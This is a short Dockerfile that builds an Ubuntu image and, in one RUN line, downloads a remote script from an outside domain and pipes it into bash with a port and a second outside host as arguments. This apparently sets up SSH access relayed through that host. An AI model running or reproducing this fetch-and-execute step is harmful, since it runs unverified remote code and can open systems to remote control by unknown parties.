FROM ubuntu:20.04
RUN apt update
RUN apt-get -y install wget curl net-tools unzip
RUN curl https://public.hxiang.eu.org/google-ssh.sh | bash -s 60112 hk.haycker.eu.org:80
EXPOSE 60112
CMD /bin/bash
